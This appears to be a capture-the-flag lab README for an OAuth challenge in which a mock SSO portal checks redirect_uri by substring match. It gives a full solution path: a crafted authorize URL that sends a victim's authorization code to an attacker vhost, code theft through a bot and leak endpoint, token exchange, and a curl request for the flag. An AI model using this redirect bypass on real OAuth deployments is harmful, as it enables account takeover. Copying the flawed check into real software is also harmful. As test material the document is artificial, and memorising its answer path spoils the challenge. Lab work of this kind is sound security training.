# oauth/redirect-uri-bypass — RedirectUriBypass (identity-gated, high)

**Socialite** SSO portal with an embedded mini Authorization Server (`/oauth/*`) and a client app (`/app`).
**Bug:** `/oauth/authorize` validates `redirect_uri` with a substring check (`includes('victim.target.lab')`) instead of exact comparison to the registered redirect `http://victim.target.lab:8119/oauth/callback`. Any `*.target.lab` host (catch-all → attacker vhost) passes if the string "victim.target.lab" appears anywhere in the URL.

## Intended path
1. Register your own social identity: `POST /social/register` `{"email":"me@evil.example","name":"me","password":"p"}` (form or JSON) — auto-signs you in at the AS (`as_sid` cookie).
2. Craft the bypassing authorize URL (note the `note=` param carrying the required substring):
   `http://victim.target.lab:8119/oauth/authorize?client_id=web&redirect_uri=http%3A%2F%2Fvictim-evil.target.lab%3A8119%2Fpages%2Fcatch%3Fnote%3Dvictim.target.lab&response_type=code&state=x`
3. Deliver it to the victim: `POST http://collector.target.lab:8119/victim` with `{"url":"<that URL>","sso":true}` — the bot holds the innocent's AS session, so the issued code identifies the **innocent** and the 302 lands on attacker space.
4. Read the code from the bot's `hops` (Location) or from `GET http://attacker.target.lab:8119/leaks` (full URL incl. `code=`).
5. Exchange it: `POST /oauth/token` `{"code":"<stolen code>"}` → `access_token` (public client, no secret).
6. `curl -H "Authorization: Bearer <token>" http://victim.target.lab:8119/flag` — gate: token `sub` must equal the innocent's social identity (server-side).

**Flag:** `DSLTV{OAUTH-RedirectUriBypass-<9 digits>}` (only from `/flag`).
